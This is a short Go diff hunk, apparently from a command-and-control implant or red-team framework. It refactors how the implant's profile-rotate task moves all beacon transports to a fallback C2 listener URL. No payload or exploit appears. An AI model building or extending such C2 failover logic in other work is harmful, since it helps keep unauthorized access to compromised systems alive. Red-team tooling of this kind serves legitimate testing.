@@ -61,8 +61,7 @@ func handleProfileRotate(task Task, res *TaskResult) {
 		// final URL as C2URLs[idx] + beaconURI, so replacing the list moves
 		// every transport (HTTP/mTLS/gRPC/WSS/...) to the fallback listener.
 		profileOverrides.c2URL = pr.C2URL
-		C2URLs = []string{pr.C2URL}
-		currentC2Idx = 0
+		c2URLsStore([]string{pr.C2URL}, 0)
 	}
 	res.Output = "profile rotated"
 }
